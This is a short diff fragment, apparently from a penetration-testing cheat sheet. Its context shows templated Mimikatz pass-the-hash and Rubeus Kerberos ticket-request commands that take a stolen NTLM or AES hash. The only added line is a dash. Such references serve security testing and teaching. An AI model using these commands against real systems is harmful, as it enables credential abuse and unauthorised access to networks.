@@ -35,3 +35,4 @@ sekurlsa::pth /domain: <domain> /user: <username> /<ntlm/rc4>: <hash>
 ```
 Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <hash> /nowrap
 ```
+-
